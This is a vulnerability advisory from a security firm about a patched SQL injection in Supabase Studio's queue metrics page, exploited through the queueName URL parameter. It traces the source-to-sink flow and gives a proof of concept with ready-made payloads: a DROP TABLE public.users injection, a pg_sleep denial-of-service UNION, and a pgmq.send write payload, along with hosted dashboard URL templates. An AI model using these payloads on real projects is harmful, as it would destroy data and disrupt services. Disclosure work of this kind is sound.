---
schema_version: "1.0.0"
document_id: "66dba196d2fb91f9ac26f930d7c385a704becb7cb186393d9cdc99b85be926e0"
company_key: "yc-winfunc"
company: "winfunc"
source_id: "yc-winfunc-rss-7ebe4d6da681"
canonical_url: "https://winfunc.com/hacktivity/supabase-sql-injection-via-queue-names"
published_at: "2025-01-01T00:00:00+00:00"
first_seen_at: "2026-07-20T23:21:05.938183+00:00"
fetched_at: "2026-07-28T20:58:25.712310+00:00"
content_hash: "sha256:04b90da37c27b883758722967bb768ee7e294c45178caa86242af2107927037d"
---

# SQL Injection via queueName in getDatabaseQueuesMetrics

[Back to Hacktivity](https://winfunc.com/hacktivity)


### Status: Patched


This vulnerability has been verified as resolved and deployed.


Supabase


Critical


2025


# SQL Injection via queueName in getDatabaseQueuesMetrics


## Summary


SQL Injection via queueName in getDatabaseQueuesMetrics


` getDatabaseQueuesMetrics` builds SQL statements with` queueName` interpolated directly into table identifiers and literals. The` queueName` value originates from the route parameter (` /integrations/queues/queues/:queueName` ) which is attacker-controllable. No validation or quoting is applied before the SQL is sent to` executeSql` , allowing crafted queue names to break out of the identifier context and execute arbitrary SQL statements against the project database.


### CVSS Score


Vector


N


Complexity


L


Privileges


L


User Interaction


R


Scope


U


Confidentiality


H


Integrity


H


Availability


H


CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H


### Vulnerability Location


Source


Line 35


supabase /apps


/studio


/components


/interfaces


/Integrations


/Queues


/QueueTab.tsx


QueueTab


Sink


Line 47


supabase /apps


/studio


/data


/database-queues


/database-queues-metrics-query.ts


getDatabaseQueuesMetrics


## Source-to-Sink Analysis


1


supabase/apps/studio/data/database-queues/database-queues-metrics-query.ts:44


` getDatabaseQueuesMetrics` invokes` executeSql` with a SQL string built from the queue name.


TYPESCRIPT


```text
const   { result } =  await    executeSql  ({


```


2


supabase/apps/studio/data/database-queues/database-queues-metrics-query.ts:47


Queue name flows into` preciseMetricsSqlQuery` without validation.


TYPESCRIPT


```text
sql  :  preciseMetricsSqlQuery  (queueName),


```


3


supabase/apps/studio/data/database-queues/database-queues-metrics-query.ts:23


The template literal concatenates` queueName` directly into the identifier, enabling injection.


TYPESCRIPT


```text
"pgmq"  . "q_${queueName}"  ;


```


4


supabase/apps/studio/components/interfaces/Integrations/Queues/QueueTab.tsx:35


` queueName` originates from the URL parameter, which can be controlled by attackers.


TYPESCRIPT


```text
const   {  childId  : queueName, ref } =  useParams  ()


```


## Impact Analysis


### Critical Impact


Arbitrary SQL execution, including data exfiltration, table deletion, privilege escalation, or extension installation.


### Attack Surface


Supabase Studio queue detail pages (` /project/<ref>/integrations/queues/queues/:queueName` ) loaded by authenticated project members—the route binds the attacker-controlled` queueName` directly into privileged` executeSql` calls.


### Preconditions


The attacker needs a regular user account to craft URLs or entice an administrator to click the link. The target user must have access to the queue metrics page (standard for project members).


## Proof of Concept


### Environment Setup


Requirements: Ubuntu 22.04 LTS (or any OS with Node.js 18+, npm, and git installed).


Install dependencies:


BASH


```text
git  clone   https://github.com/supabase/supabase.git
cd   supabase/apps/studio
npm install
npm run dev


```


### Target Configuration


The Studio app runs on` http://localhost:3000` . Ensure your Supabase backend is configured (or mock the API). For PoC, a development project with queues enabled is sufficient.


### Exploit Delivery


Authenticate as any tenant user with access to the project dashboard.


Manually craft the queue URL without creating such a queue:


TEXT


```text
http://localhost:3000/project/<projectRef>/integrations/queues/queues/foo";%20DROP%20TABLE%20public.users;%20--


```


To reproduce the production-reported slowdown, first create a disposable queue named` foo` via **Add queue** , then browse directly to the crafted queue detail route. Supply this queueName payload to UNION in a` pg_sleep(50)` call:


TEXT


```text
foo%22%20UNION%20SELECT%201::bigint%20AS%20msg_id,%20now()%20AS%20enqueued_at,%200::int%20AS%20read_ct,%20now()%20AS%20vt,%20'%7B%7D'::jsonb%20AS%20message,%20NULL::timestamptz%20AS%20archived_at%20FROM%20pg_sleep(50)--


```


Hosted dashboard URL template:


TEXT


```text
https://supabase.com/dashboard/project/<PROJECT>/integrations/queues/queues/foo%22%20UNION%20SELECT%201::bigint%20AS%20msg_id,%20now()%20AS%20enqueued_at,%200::int%20AS%20read_ct,%20now()%20AS%20vt,%20'%7B%7D'::jsonb%20AS%20message,%20NULL::timestamptz%20AS%20archived_at%20FROM%20pg_sleep(50)--


```


For write-oriented exploitation, UNION in a direct call to` pgmq.send` to enqueue attacker data without interacting with the UI:


SQL


```text
-- Injection payload (queueName = foo" ...)
UNION    SELECT   pgmq.send( 'foo'  , '{"attacker":true}'  , 0  ):: bigint    AS   msg_id,
now()  AS   enqueued_at,
0  :: int    AS   read_ct,
now()  AS   vt,
'{"attacker":true}'  ::jsonb  AS   message,
NULL  ::timestamptz  AS   archived_at --


```


Raw queueName value:


TEXT


```text
foo" UNION SELECT pgmq.send('foo','{"attacker":true}',0)::bigint AS msg_id, now() AS enqueued_at, 0::int AS read_ct, now() AS vt, '{"attacker":true}'::jsonb AS message, NULL::timestamptz AS archived_at--


```


Encoded payload and dashboard URL:


TEXT


```text
foo%22%20UNION%20SELECT%20pgmq.send('foo','%7B%22attacker%22:true%7D',0)::bigint%20AS%20msg_id,%20now()%20AS%20enqueued_at,%200::int%20AS%20read_ct,%20now()%20AS%20vt,%20'%7B%22attacker%22:true%7D'::jsonb%20AS%20message,%20NULL::timestamptz%20AS%20archived_at--
https://supabase.com/dashboard/project/<PROJECT>/integrations/queues/queues/foo%22%20UNION%20SELECT%20pgmq.send('foo','%7B%22attacker%22:true%7D',0)::bigint%20AS%20msg_id,%20now()%20AS%20enqueued_at,%200::int%20AS%20read_ct,%20now()%20AS%20vt,%20'%7B%22attacker%22:true%7D'::jsonb%20AS%20message,%20NULL::timestamptz%20AS%20archived_at--


```


### Outcome


Observed effects range from destructive DDL (dropping` public.users` ), to prolonged availability impact via` pg_sleep` , to silent data integrity violations by writing arbitrary messages into tenant queues.


**Expected Response:** When the page loads, Studio invokes` getDatabaseQueuesMetrics` , executing the SQL:


SQL


```text
SELECT    COUNT  ( *  )  AS   row_count  FROM   "pgmq"."q_foo";  DROP    TABLE   public.users;  --";


```


The` pg_sleep(50)` payload keeps the request inflight for ~50 seconds, demonstrating a trivial blocking DoS. The` pgmq.send` UNION returns a synthesized queue row containing the injected JSON, proving arbitrary SQL that enqueues attacker-controlled messages.


## Run this level of analysis on your repo.


Winfunc traces source-to-sink paths, validates exploitability, and gives your team patch-ready remediation.


[Vulnerability Detection](https://winfunc.com/products/scanner/vulnerability-detection)


[View Patch PR Verify fix on GitHub](https://github.com/supabase/supabase/pull/40290)
